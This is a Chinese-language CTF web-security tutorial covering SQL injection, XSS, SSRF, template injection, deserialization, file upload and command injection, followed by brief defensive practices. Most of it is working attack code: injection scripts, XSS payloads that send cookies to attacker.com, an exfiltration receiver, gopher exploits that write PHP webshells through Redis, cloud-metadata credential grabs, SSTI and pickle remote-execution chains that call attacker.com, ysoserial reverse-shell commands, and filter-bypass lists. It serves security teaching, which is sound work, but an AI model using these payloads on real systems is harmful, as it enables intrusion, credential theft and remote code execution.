# CTF Web方向详解

> 本文档详细讲解CTF竞赛中Web安全方向的各类题型，包括SQL注入、XSS、SSRF、SSTI、反序列化、文件上传、命令注入等，每类题型附带代码示例、解题思路和实战案例。

---

## 目录

- [一、SQL注入CTF题型](#一sql注入ctf题型)
- [二、XSS CTF题型](#二xss-ctf题型)
- [三、SSRF CTF题型](#三ssrf-ctf题型)
- [四、SSTI模板注入](#四ssti模板注入)
- [五、反序列化漏洞](#五反序列化漏洞)
- [六、文件上传漏洞](#六文件上传漏洞)
- [七、命令注入](#七命令注入)
- [八、实战案例](#八实战案例)

---

## 一、SQL注入CTF题型

SQL注入是CTF Web方向最基础的题型之一，考察对SQL语句构造和数据库原理的理解。

### 1.1 联合查询注入（UNION Based）

当页面直接返回查询结果时，可以使用UNION注入。

```sql
-- 判断注入点
' AND 1=1-- -    -- 页面正常
' AND 1=2-- -    -- 页面异常

-- 判断列数
' ORDER BY 1-- -    -- 正常
' ORDER BY 2-- -    -- 正常
' ORDER BY 3-- -    -- 异常 → 列数为2

-- 确定回显位
' UNION SELECT 1,2-- -

-- 获取数据库信息
' UNION SELECT database(),version()-- -

-- 获取表名
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -

-- 获取列名
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='flag_table'-- -

-- 获取Flag
' UNION SELECT flag,2 FROM flag_table-- -
```

**Python自动化脚本示例**：
```python
import requests

def union_sqli(url, payload_col_count):
    """联合查询注入 - 确定列数"""
    for i in range(1, 20):
        payload = f"' ORDER BY {i}-- -"
        params = {"id": payload}
        r = requests.get(url, params=params)
        if "error" in r.text.lower() or not r.text.strip():
            return i - 1
    return -1

def dump_data(url, num_cols):
    """通过联合查询获取数据"""
    # 构造UNION SELECT
    cols = ",".join(["table_name" if j == 0 else str(j) for j in range(num_cols)])
    payload = f"' UNION SELECT {cols} FROM information_schema.tables WHERE table_schema=database()-- -"
    r = requests.get(url, params={"id": payload})
    # 解析返回结果
    return r.text
```

### 1.2 盲注（Boolean Based & Time Based）

当页面不返回查询结果，但有真假两种不同响应时，使用布尔盲注。当页面无任何差异时，使用时间盲注。

**布尔盲注**：
```python
import requests

def boolean_blind_sqli(url):
    """布尔盲注 - 逐字符获取数据"""
    result = ""
    
    for i in range(1, 100):
        # 二分法确定每个字符
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            # 构造布尔条件
            payload = f"' AND ASCII(SUBSTR(database(),{i},1))>{mid}-- -"
            r = requests.get(url, params={"id": payload})
            
            if "正常页面标志" in r.text:
                low = mid + 1
            else:
                high = mid
        
        result += chr(low)
        print(f"[+] 当前结果: {result}")
        if low == 32:
            break
    
    return result
```

**时间盲注**：
```python
import requests
import time

def time_blind_sqli(url):
    """时间盲注 - 使用SLEEP函数"""
    for i in range(1, 100):
        for j in range(32, 127):
            # 构造时间延迟条件
            payload = f"' AND IF(ASCII(SUBSTR(database(),{i},1))={j},SLEEP(2),0)-- -"
            
            start = time.time()
            r = requests.get(url, params={"id": payload})
            elapsed = time.time() - start
            
            if elapsed > 1.5:
                print(f"[+] 第{i}个字符: {chr(j)}")
                break
```

### 1.3 堆叠注入（Stacked Queries）

在支持多语句执行的环境（如MySQL的PDO、SQL Server）中，可以使用分号分隔多个SQL语句。

```sql
-- 堆叠注入示例
'; SHOW DATABASES;-- -
'; SHOW TABLES FROM test;-- -
'; SHOW COLUMNS FROM flag;-- -
'; SELECT * FROM flag;-- -

-- MySQL中通过PREPARE绕过过滤
'; SET @sql=CONCAT('sel','ect * from `flag`'); PREPARE stmt FROM @sql; EXECUTE stmt;-- -
```

### 1.4 绕过WAF技巧

```python
# 常见WAF绕过技巧
waf_bypass = {
    # 关键字绕过
    "union": "UnIoN, /*!50000union*/, uniounionn",
    "select": "selselectect, /*!50000select*/, %0a sele%0a ct",
    "and": "&&, aND, %26%26",
    "or": "||, oR, %7c%7c",
    "空格": "/**/, %0a, %0b, %0c, %09, +",
    "=": "like, in, between, <>",
    
    # 大小写混合
    "case": "UnIoN SeLeCt",
    
    # 内联注释（MySQL特有）
    "inline": "/*!50000UNION*/ /*!50000SELECT*/",
    
    # 编码绕过
    "hex": "0x666c6167 (flag的hex)",
    "char": "CHAR(102,108,97,103) (flag)",
    
    # 双写绕过（过滤一次的情况）
    "double": "ununionion selselectect",
}
```

### 1.5 NoSQL注入

```python
# MongoDB NoSQL注入
import requests
import json

# 绕过登录
url = "http://example.com/login"

# 方式1：使用$ne操作符
payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
r = requests.post(url, json=payload)

# 方式2：使用$gt逐字符获取
for i in range(1, 50):
    for c in range(32, 127):
        payload = {
            "username": "admin",
            "password": {"$regex": f"^.{{{i}}}{chr(c)}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:
            result += chr(c)
            break
```

---

## 二、XSS CTF题型

XSS（跨站脚本攻击）在CTF中常用于窃取Cookie、触发特定条件获取Flag。

### 2.1 反射型XSS

```html
<!-- 基本反射型XSS -->
<script>alert(1)</script>

<!-- 窃取Cookie -->
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

<!-- 常见变体 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### 2.2 存储型XSS

```python
# 存储型XSS - 留言板注入
import requests

# 注入恶意脚本
xss_payload = '<script>document.location="http://attacker.com/collect?c="+document.cookie</script>'
requests.post("http://example.com/comment", data={"content": xss_payload})

# 当管理员查看留言时，Cookie被发送到攻击者服务器
```

### 2.3 DOM型XSS

```javascript
// 源码示例 - 存在DOM XSS
// page.html
/*
<div id="content"></div>
<script>
    var hash = location.hash.slice(1);
    document.getElementById('content').innerHTML = hash;
</script>
*/

// 利用Payload
// page.html#<img src=x onerror=alert(document.cookie)>

// 修复方案
// 使用textContent替代innerHTML
// 或对输入进行HTML实体编码
```

### 2.4 CSP绕过

```javascript
// CSP策略: script-src 'self' cdn.example.com
// 绕过方法1: 利用CDN上的JS文件（AngularJS）
<script src="https://cdn.example.com/angular.min.js"></script>
<div ng-app ng-csp>
    {{constructor.constructor('alert(document.cookie)')()}}
</div>

// 绕过方法2: 利用文件上传
// 上传一个JS文件到同源服务器
<script src="/uploads/malicious.js"></script>

// 绕过方法3: 利用JSONP回调
<script src="https://cdn.example.com/api?callback=alert(document.cookie)//"></script>

// 绕过方法4: base标签重定向
<base href="https://attacker.com/">
<script src="/static/main.js"></script>
```

### 2.5 XSS利用框架

```python
# XSS数据接收平台（简化版）
from http.server import HTTPServer, BaseHTTPRequestHandler

class XSSReceiver(BaseHTTPRequestHandler):
    def do_GET(self):
        """接收XSS发送的数据"""
        if '?' in self.path:
            data = self.path.split('?', 1)[1]
            print(f"[+] 收到数据: {data}")
            with open("stolen_data.txt", "a") as f:
                f.write(data + "\n")
        
        # 返回空白图片
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

# 启动接收服务器
server = HTTPServer(('0.0.0.0', 8888), XSSReceiver)
print("[*] XSS接收服务启动在 8888 端口")
server.serve_forever()
```

---

## 三、SSRF CTF题型

SSRF（Server-Side Request Forgery，服务端请求伪造）允许攻击者利用服务器发起内网请求。

### 3.1 内网探测

```python
import requests

def ssrf_scan(base_url):
    """利用SSRF进行内网端口扫描"""
    open_ports = []
    
    for port in range(1, 65536):
        # 构造SSRF Payload
        target = f"http://127.0.0.1:{port}"
        params = {"url": target}
        
        try:
            r = requests.get(base_url, params=params, timeout=3)
            # 根据响应差异判断端口是否开放
            if len(r.text) > 100 or "connection refused" not in r.text.lower():
                open_ports.append(port)
                print(f"[+] 端口 {port} 开放")
        except:
            pass
    
    return open_ports

# 常见内网服务端口
common_ports = {
    22: "SSH",
    80: "HTTP",
    443: "HTTPS",
    6379: "Redis",
    3306: "MySQL",
    27017: "MongoDB",
    9200: "Elasticsearch",
    8080: "HTTP-Alt",
}
```

### 3.2 Redis利用

```python
# SSRF + Redis未授权访问 → 写Webshell
import requests
import urllib.parse

def ssrf_redis_exploit(ssrf_url, redis_target, webshell_path):
    """通过SSRF攻击内网Redis"""
    
    # 构造Redis命令
    redis_commands = f"""
    config set dir {webshell_path}
    config set dbfilename shell.php
    set test "<?php @eval($_POST[cmd]);?>"
    save
    """
    
    # 使用gopher协议发送Redis命令
    # 将Redis命令转换为RESP协议格式
    resp = ""
    for cmd in redis_commands.strip().split('\n'):
        cmd = cmd.strip()
        if cmd:
            resp += f"*{len(cmd.split())}\r\n"
            for arg in cmd.split():
                resp += f"${len(arg)}\r\n{arg}\r\n"
    
    # URL编码
    gopher_payload = f"gopher://{redis_target}:6379/_" + urllib.parse.quote(resp)
    
    # 通过SSRF发送
    r = requests.get(ssrf_url, params={"url": gopher_payload})
    print(r.text)
```

### 3.3 Gopher协议利用

```python
# Gopher协议发送HTTP请求
import urllib.parse

def gopher_http_request(target_host, target_port, path):
    """构造gopher协议的HTTP请求"""
    
    http_request = f"GET {path} HTTP/1.1\r\n"
    http_request += f"Host: {target_host}:{target_port}\r\n"
    http_request += "Connection: close\r\n"
    http_request += "\r\n"
    
    # URL编码（gopher协议需要对整个请求进行URL编码）
    encoded = urllib.parse.quote(http_request)
    
    gopher_url = f"gopher://{target_host}:{target_port}/_{encoded}"
    return gopher_url

# 示例：通过SSRF + gopher访问内网服务
# gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

### 3.4 MySQL利用

```python
# SSRF + MySQL未授权 → 读取数据
# 使用gopher协议构造MySQL协议数据包

def ssrf_mysql_query(ssrf_url, mysql_host, query):
    """通过SSRF执行MySQL查询"""
    
    # MySQL协议较为复杂，通常使用工具生成
    # 工具: Gopherus (https://github.com/tarunkant/Gopherus)
    
    # 示例payload（简化）
    # 实际需要完整构造MySQL认证和查询包
    gopher_payload = "gopher://mysql_host:3306/_" + "编码后的MySQL协议数据"
    
    r = requests.get(ssrf_url, params={"url": gopher_payload})
    return r.text
```

### 3.5 云服务元数据

```python
# 云服务SSRF利用 - 读取实例元数据
cloud_metadata = {
    # AWS
    "aws_iam_role": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_user_data": "http://169.254.169.254/latest/user-data",
    
    # GCP
    "gcp_token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    
    # Azure
    "azure_token": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Alibaba Cloud
    "aliyun_metadata": "http://100.100.100.200/latest/meta-data/",
}

# 通过SSRF读取
for name, url in cloud_metadata.items():
    r = requests.get(ssrf_url, params={"url": url})
    print(f"[{name}] {r.text}")
```

### 3.6 SSRF绕过技巧

```python
# 常见SSRF过滤绕过方法
ssrf_bypass = {
    # IP地址绕过
    "进制转换": "127.0.0.1 → 0x7f000001 / 2130706433 / 017700000001",
    "DNS解析": "本地DNS指向127.0.0.1的域名如 localtest.me",
    "IPv6": "127.0.0.1 → [::1] / [0:0:0:0:0:0:0:1]",
    "短链接": "使用短链接服务跳转到内网地址",
    "URL解析差异": "http://127.0.0.1@evil.com → 解析到evil.com",
    "DNS Rebinding": "第一次解析公网IP，第二次解析内网IP",
    
    # 协议绕过
    "其他协议": "file:// / dict:// / gopher:// / ldap://",
    
    # 重定向绕过
    "302跳转": "在自己服务器上设置302跳转到内网地址",
}

# DNS Rebinding实现
"""
1. 在DNS服务商设置两条A记录：
   - rebind.attacker.com → 攻击者IP（TTL=0）
   - rebind.attacker.com → 127.0.0.1（TTL=0）
2. 服务端第一次验证DNS时解析到攻击者IP（通过验证）
3. 服务端实际请求时DNS解析到127.0.0.1（访问内网）
"""
```

---

## 四、SSTI模板注入

SSTI（Server-Side Template Injection，服务端模板注入）发生在服务端渲染模板时拼接了用户输入。

### 4.1 检测与识别

```python
# SSTI检测Payload
ssti_detection = [
    # 通用检测
    "{{7*7}}",        # → 49 → Jinja2/Twig
    "${7*7}",         # → 49 → FreeMarker/Velocity
    "#{7*7}",         # → 49 → Ruby ERB
    "<%= 7*7 %>",     # → 49 → ERB/EJS
    "{{7*'7'}}",      # → 7777777 → Jinja2
    "{{7*'7'}}",      # → 49 → Twig
    
    # 各框架特征检测
    "{{ ''.__class__ }}",                    # Jinja2
    "{{ request.application.__globals__ }}", # Jinja2 Flask
    "{{ _self }}",                           # Twig
    "{{ ''.__class__ }}",                    # Twig (报错)
    "#{ ''.__class__ }",                     # FreeMarker (报错)
]
```

### 4.2 Jinja2（Python Flask）

```python
# Jinja2 SSTI利用链

# 1. 获取基础类
{{ ''.__class__ }}                    # <class 'str'>
{{ ''.__class__.__mro__ }}           # 查看继承链
{{ ''.__class__.__mro__[1] }}        # <class 'object'>

# 2. 获取所有子类
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 3. 找到os模块并执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}

# 4. 利用config对象（Flask）
{{ config }}                          # 查看Flask配置
{{ config.SECRET_KEY }}              # 获取密钥
{{ config.items() }}                 # 获取所有配置

# 5. 利用lipsum
{{ lipsum.__globals__['os'].popen('id').read() }}

# 6. 利用cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 7. 过滤绕过
# 下划线被过滤 → 使用 attr 或 []
{{ ''['__class__'] }}                # 点号变下标
{{ ''|attr('__class__') }}          # attr过滤器
# 关键字被过滤 → 字符串拼接
{{ ''['__cl'+'ass__'] }}
# 引号被过滤 → chr拼接
{{ ().__doc__ }}                     # 利用__doc__中的字符
```

### 4.3 Twig（PHP）

```php
// Twig SSTI利用

// 基本执行
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Twig 2.x
{{["id"]|map("system")}}

// 过滤后利用
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### 4.4 Freemarker（Java）

```java
// Freemarker SSTI利用

// 命令执行
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}

// 读取文件
<#assign is=cmd?new("freemarker.template.utility.Execute")("cat /etc/passwd")>

// 绕过过滤
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder$PipedReader")()}
```

### 4.5 Smarty（PHP）

```php
// Smarty SSTI利用

// 命令执行
{system('id')}
{Smarty_Internal_Writefile::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",get_current_user())}

// 获取配置
{$smarty.version}
```

---

## 五、反序列化漏洞

### 5.1 PHP反序列化

```php
<?php
// 漏洞代码示例
class FileHandler {
    public $filename;
    
    public function __destruct() {
        echo file_get_contents($this->filename);
    }
}

// 存在漏洞的入口
$data = $_GET['data'];
$obj = unserialize($data);

// 攻击Payload构造
class FileHandler {
    public $filename = "/flag";
}
echo serialize(new FileHandler());
// 输出: O:11:"FileHandler":1:{s:8:"filename";s:5:"/flag";}
?>
```

```python
# PHP POP链构造工具
# 常用魔术方法触发顺序：
# __construct → __wakeup → __destruct
# __toString → __call → __get → __isset

# 常见PHP反序列化绕过
php_unserialize_bypass = {
    # __wakeup绕过（CVE-2016-7124）
    # PHP < 5.6.25, PHP < 7.0.10
    "wakeup_bypass": "修改属性个数大于实际值: O:4:"User":3:{...} (实际只有2个属性)",
    
    # 字符串逃逸
    "string_escape": "利用str_replace导致的长度变化逃逸",
    
    # phar反序列化
    "phar": "利用phar文件触发反序列化（file_exists等函数）",
    
    # Session反序列化
    "session": "利用session序列化引擎差异",
}
```

### 5.2 Java反序列化

```java
// Java反序列化漏洞原理
// ObjectInputStream.readObject() 读取序列化数据时触发

// 常见利用链
java_gadgets = {
    "CommonsCollections": "Apache Commons Collections 反序列化链",
    "CommonsBeanutils": "Apache Commons Beanutils 链",
    "Fastjson": "Fastjson JNDI注入",
    "JdbcRowSetImpl": "JdbcRowSetImpl JNDI注入",
    "Spring": "Spring框架反序列化",
    "Shiro": "Apache Shiro RememberMe反序列化（AES+CookieRememberMe）",
}

// ysoserial工具使用
// java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell|bash'
```

```python
# Shiro反序列化检测与利用
import base64
import requests

def shiro_detect(url):
    """检测Shiro框架"""
    # Shiro特征Cookie
    headers = {
        "Cookie": "rememberMe=test",
        "User-Agent": "Mozilla/5.0"
    }
    r = requests.get(url, headers=headers, allow_redirects=False)
    
    # 检查响应头中的Set-Cookie是否有rememberMe=deleteMe
    if 'rememberMe=deleteMe' in str(r.headers):
        print("[+] 检测到Shiro框架")
        return True
    return False

def shiro_exploit(url, key, gadget):
    """Shiro反序列化利用"""
    # 1. 使用 ysoserial 生成序列化Payload
    # 2. 使用Shiro密钥AES加密
    # 3. Base64编码
    # 4. 放入rememberMe Cookie
    # 注意：需要爆破Shiro密钥（常见默认密钥）
    pass
```

### 5.3 Python pickle反序列化

```python
import pickle
import os

# 恶意pickle数据
class Exploit:
    def __reduce__(self):
        # __reduce__返回的元组决定反序列化时执行的操作
        # (callable, (args,)) → callable(*args)
        return (os.system, ('cat /flag',))

# 生成恶意序列化数据
malicious = pickle.dumps(Exploit())
print(malicious)

# 当存在漏洞的代码执行 pickle.loads(malicious) 时
# 会调用 os.system('cat /flag')

# 更隐蔽的利用 - 使用exec执行任意代码
import pickle, base64

class RCE:
    def __reduce__(self):
        return (exec, ("import os; os.system('curl http://attacker.com/$(cat /flag)')",))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

---

## 六、文件上传漏洞

### 6.1 绕过后缀检查

```python
# 常见后缀绕过方法
extension_bypass = [
    # 大小写绕过
    ".PhP", ".pHp", ".PHP",
    
    # 双写绕过
    ".pphphp",  # 过滤php后变为.php
    
    # 特殊后缀（Apache解析）
    ".php3", ".php4", ".php5", ".php7", ".phtml", ".pht",
    
    # Windows特殊文件名
    ".php ",     # 空格（Windows自动去除）
    ".php.",     # 点号（Windows自动去除）
    ".php::$DATA",  # NTFS数据流
    
    # .htaccess绕过
    # 上传.htaccess: AddType application/x-httpd-php .jpg
    # 然后上传shell.jpg作为PHP执行
    
    # .user.ini绕过
    # 上传.user.ini: auto_prepend_file=shell.jpg
    # 然后上传shell.jpg，访问同目录下任意php文件触发
    
    # 利用0x00截断
    # shell.php%00.jpg (PHP < 5.3.4)
    
    # 利用解析漏洞
    # IIS 6.0: shell.asp;.jpg
    # Nginx: shell.jpg/.php (配置不当)
    # Apache: shell.php.xxx (未知后缀按PHP解析)
]

# Python自动化绕过测试
import requests

def upload_bypass(url, filename_content_pairs):
    """尝试各种后缀绕过"""
    for filename, content in filename_content_pairs:
        files = {"file": (filename, content, "application/octet-stream")}
        r = requests.post(url, files=files)
        if "success" in r.text.lower():
            print(f"[+] 上传成功: {filename}")
            # 尝试访问上传的文件
            shell_url = f"http://example.com/uploads/{filename}"
            verify = requests.get(shell_url)
            if verify.status_code == 200:
                print(f"[+] Webshell: {shell_url}")
                return shell_url
    return None
```

### 6.2 绕过Content-Type

```python
# 服务端检查Content-Type时的绕过
import requests

# 修改Content-Type为图片类型
files = {
    "file": ("shell.php", 
             "<?php @eval($_POST['cmd']); ?>",
             "image/jpeg")  # 伪装为图片
}
r = requests.post("http://example.com/upload.php", files=files)
```

### 6.3 图片马制作

```bash
# 方法1：将PHP代码附加到图片尾部
copy /b normal.jpg + shell.php shell.jpg

# 方法2：在图片EXIF中嵌入PHP代码
exiftool -comment='<?php @eval($_POST["cmd"]); ?>' shell.jpg

# 方法3：利用GIF文件头
# GIF89a开头 + PHP代码
echo -ne 'GIF89a<?php @eval($_POST["cmd"]); ?>' > shell.gif

# 配合文件包含漏洞使用
# 如果存在 include($_GET['file']) ，则:
# http://example.com/index.php?file=upload/shell.gif
```

### 6.4 .htaccess利用

```apache
# .htaccess文件 - Apache配置文件
# 上传.htaccess使其他文件被当作PHP执行

# 方法1：指定文件类型
AddType application/x-httpd-php .jpg

# 方法2：使用FilesMatch
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>

# 方法3：使用php_value
php_value auto_prepend_file shell.jpg
```

---

## 七、命令注入

### 7.1 无回显注入

```python
import requests
import time

# 当命令执行结果不返回页面时
# 方法1：时间盲注
def time_based_cmd_injection(url, param):
    """时间盲注确认命令注入"""
    payload = "; sleep 5; #"
    
    start = time.time()
    r = requests.get(url, params={param: payload})
    elapsed = time.time() - start
    
    if elapsed > 4:
        print("[+] 存在命令注入")
        return True
    return False

# 方法2：DNS外带数据
def oob_cmd_injection(url, param):
    """通过DNS外带数据"""
    domain = "attacker.com"
    payload = f"; curl http://$(cat /flag | base64).{domain}; #"
    requests.get(url, params={param: payload})
    # 在DNS服务器上查看查询记录

# 方法3：写文件后读取
def file_write_cmd_injection(url, param, web_root):
    """将命令结果写入文件后读取"""
    payload = f"; cat /flag > {web_root}/output.txt; #"
    requests.get(url, params={param: payload})
    
    # 读取输出文件
    r = requests.get(f"http://example.com/output.txt")
    return r.text
```

### 7.2 绕过过滤

```python
# 命令注入过滤绕过
cmd_injection_bypass = {
    # 空格绕过
    "space": [
        "${IFS}",      # 内部字段分隔符
        "$IFS",        # 同上
        "{cat,/flag}", # 大括号展开
        "<",           # 重定向
        "%09",         # Tab字符
        "%20",         # URL编码空格
    ],
    
    # 关键字绕过
    "keyword": [
        "cat → ca''t, ca\\t, ca${x}t, /bin/cat",
        "flag → fla''g, fla\\g, f??g, fl*g",
        "ls → l''s, l\\s",
        "sh → /bin/sh, /bin/bash",
    ],
    
    # 通配符绕过
    "wildcard": [
        "/bin/cat /fla* → /???/??t /???g",
        "ls /flag → /bin/l? /fla?",
    ],
    
    # 变量绕过
    "variable": [
        "a=ca;b=t;$a$b /flag",
        "a=fl;b=ag;cat /$a$b",
    ],
    
    # 反引号/命令替换
    "backtick": [
        "`cat /flag`",
        "$(cat /flag)",
    ],
    
    # 编码绕过
    "encoding": [
        # Base64
        "$(echo Y2F0IC9mbGFn | base64 -d)",
        # Hex
        "$(echo 636174202f666c6167 | xxd -r -p)",
        # Oct
        "$(printf '\\x63\\x61\\x74')",
    ],
}

# 命令分隔符
separators = [";", "&&", "||", "|", "&",  "%0a", "%0d"]
```

### 7.3 Linux特殊字符

```bash
# 常用命令注入分隔符
;     # 顺序执行多条命令
|     # 管道，前一条命令的输出作为后一条的输入
||    # 前一条失败才执行后一条
&&    # 前一条成功才执行后一条
&     # 后台执行
%0a   # 换行符
%0d   # 回车符
$()   # 命令替换
``    # 命令替换（反引号）
```

---

## 八、实战案例

### 案例1：SQL注入 - BUUCTF [SUCTF 2019]EasySQL

```python
"""
题目分析：
- 输入数字返回查询结果
- 输入非数字返回报错
- 需要找到Flag表

解题过程：
"""
import requests

url = "http://example.com/non_exist/"

# 步骤1：测试注入点
# 输入1 → 返回查询结果
# 输入1' → 报错

# 步骤2：发现是数字型注入
# 输入1;1 → 返回两次结果 → 堆叠注入

# 步骤3：获取表名
payload = "1;show tables"
r = requests.post(url, data={"query": payload})
# 输出包含 Flag 表名

# 步骤4：获取Flag
# 发现Flag列名被过滤
# 利用重命名绕过
payload = "1;rename table Flag to flags;select * from flags"
# 或者直接用反引号
payload = "1;select * from `Flag`"

print("[+] Flag:", flag)
```

### 案例2：SSTI - 攻防世界 Web类 bad_python

```python
"""
题目分析：
- Flask应用，存在SSTI
- 过滤了 {{ }} 和部分关键字
- 需要绕过过滤执行命令

解题过程：
"""
# 绕过 {{ }} 过滤 → 使用 {%%}
# 绕过关键字过滤 → 字符串拼接

# Payload
payload = "{% if ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read() %}{% endif %}"

# 如果引号被过滤
payload = "{% set cmd='cat'+' '+'/flag' %}{% if lipsum.__globals__.os.popen(cmd).read() %}{% endif %}"

# 如果下划线被过滤
payload = "{% set a=lipsum.__globals__ %}{% set b=a.__builtins__ %}{% set c=b['eval'] %}{% if c('import os;os.system(\"cat /flag\")') %}{% endif %}"
```

### 案例3：反序列化 - BUUCTF [0CTF 2016]piapiapia

```php
<?php
/*
题目分析：
- PHP反序列化
- 存在字符串逃逸
- str_replace导致长度变化

关键代码：
$unserialize = str_replace('xxx', 'yy', $_POST['data']);
// 'xxx'(3字符) → 'yy'(2字符)，长度减少1

解题思路：
1. 利用字符串逃逸，在序列化数据中注入恶意属性
2. 需要构造足够多的'xxx'来抵消长度差
3. 最终触发__destruct中的文件读取

Payload构造：
*/
class flag_class {
    public $file = "flag.php";
}

$obj = new flag_class();
$serialized = serialize($obj);
// O:10:"flag_class":1:{s:4:"file";s:8:"flag.php";}

// 计算需要逃逸的长度
$escape_len = strlen($serialized) - strpos($serialized, '";s:4:"file"');
// 注入足够的替换标记
$payload = str_repeat('xxx', $escape_len) . $serialized;
?>
```

### 案例4：SSRF - BUUCTF [SSRF]LFI

```python
"""
题目分析：
- 存在SSRF漏洞
- 限制了协议（不能直接用file://）
- 需要读取flag文件

解题过程：
"""
import requests
import urllib.parse

# 方法1：利用gopher协议读取文件
# gopher协议可以发送任意TCP数据

# 方法2：利用dict协议探测
url = "http://example.com/ssrf.php"
params = {"url": "dict://127.0.0.1:6379/INFO"}
r = requests.get(url, params=params)
# 发现Redis

# 方法3：通过SSRF攻击Redis写文件
# 构造Redis命令写Webshell
redis_payload = """
flushall
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']); ?>"
save
"""

# 转换为gopher协议
resp = ""
for cmd in redis_payload.strip().split('\n'):
    cmd = cmd.strip()
    if cmd:
        parts = cmd.split()
        resp += f"*{len(parts)}\r\n"
        for p in parts:
            resp += f"${len(p)}\r\n{p}\r\n"

gopher = f"gopher://127.0.0.1:6379/_" + urllib.parse.quote(resp)
r = requests.get(url, params={"url": gopher})
print("[+] Webshell写入成功")
```

### 案例5：文件上传 - CTFHub 技能树

```python
"""
题目分析：
- 前端JS验证后缀
- 后端验证MIME类型
- 限制后缀为图片

解题过程：
"""
import requests

url = "http://challenge.example.com/upload.php"

# 步骤1：绕过前端JS验证（Burp抓包修改）
# 步骤2：绕过MIME验证（修改Content-Type）

# 方法1：上传图片马 + .htaccess
# 先上传.htaccess
htaccess = "AddType application/x-httpd-php .jpg"
files = {"file": (".htaccess", htaccess, "text/plain")}
r = requests.post(url, files=files)
print("[+] .htaccess上传成功")

# 再上传shell.jpg
shell = "GIF89a<?php @eval($_POST['cmd']); ?>"
files = {"file": ("shell.jpg", shell, "image/jpeg")}
r = requests.post(url, files=files)
print("[+] shell.jpg上传成功")

# 步骤3：访问Webshell
shell_url = "http://challenge.example.com/upload/shell.jpg"
print(f"[+] Webshell: {shell_url}")
print("[*] 使用蚁剑连接，密码cmd")
```

---

## 九、Web安全最佳实践

### 9.1 SQL注入防御

```python
# 正确的做法：使用参数化查询
import sqlite3

# ✅ 安全写法
conn = sqlite3.connect('test.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# ❌ 危险写法
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 9.2 XSS防御

```python
# 输出编码
import html

def safe_output(user_input):
    """对用户输入进行HTML实体编码"""
    return html.escape(user_input)

# Content-Security-Policy头
csp_header = "default-src 'self'; script-src 'self'; style-src 'self'"
```

### 9.3 SSRF防御

```python
import ipaddress
import socket

def is_internal_ip(hostname):
    """检查IP是否为内网地址"""
    try:
        ip = socket.gethostbyname(hostname)
        addr = ipaddress.ip_address(ip)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except:
        return True  # 解析失败视为危险

# 请求前验证目标地址
def safe_request(url):
    parsed = urllib.parse.urlparse(url)
    if is_internal_ip(parsed.hostname):
        raise ValueError("禁止访问内网地址")
    # 仅允许http/https协议
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("不允许的协议")
```

### 9.4 文件上传防御

```python
import os
import magic  # python-magic

def safe_upload(file, upload_dir):
    """安全的文件上传处理"""
    # 1. 白名单检查后缀
    allowed_extensions = {'.jpg', '.png', '.gif'}
    ext = os.path.splitext(file.filename)[1].lower()
    if ext not in allowed_extensions:
        raise ValueError("不允许的文件类型")
    
    # 2. 检查文件内容（Magic Number）
    file_content = file.read()
    file_type = magic.from_buffer(file_content, mime=True)
    if file_type not in ('image/jpeg', 'image/png', 'image/gif'):
        raise ValueError("文件内容与类型不匹配")
    
    # 3. 重命名文件
    import uuid
    safe_name = str(uuid.uuid4()) + ext
    
    # 4. 存储到非Web可访问目录
    save_path = os.path.join(upload_dir, safe_name)
    with open(save_path, 'wb') as f:
        f.write(file_content)
    
    return safe_name
```

---

## 十、Web方向学习总结

### 10.1 解题流程

```
1. 信息收集
   ├── 查看页面源码
   ├── 检查robots.txt
   ├── 目录扫描（dirsearch/gobuster）
   ├── 指纹识别（Wappalyzer/whatweb）
   └── 查看HTTP响应头

2. 漏洞发现
   ├── 参数测试（GET/POST/Cookie/Header）
   ├── 逻辑测试（越权/竞态/业务逻辑）
   └── 自动化扫描（Burp Active Scan）

3. 漏洞利用
   ├── 手动构造Payload
   ├── 使用自动化工具（sqlmap等）
   └── 逐步深入获取Flag

4. 后渗透
   ├── 读取Flag文件
   ├── 提权
   ├── 内网渗透
   └── 持久化（仅攻防模式）
```

### 10.2 工具清单

```
Web CTF必备工具：
├── Burp Suite（抓包、重放、扫描）
├── sqlmap（SQL注入自动化）
├── dirsearch/gobuster（目录扫描）
├── AntSword/蚁剑（Webshell管理）
├── CyberChef（编码解码）
├── Chrome DevTools（前端调试）
├── Postman（API测试）
├── wfuzz（模糊测试）
├── nmap（端口扫描）
└── Python + requests库（自定义脚本）
```

### 10.3 常用Payload速查

```
SQL注入: ' UNION SELECT 1,2,database()-- -
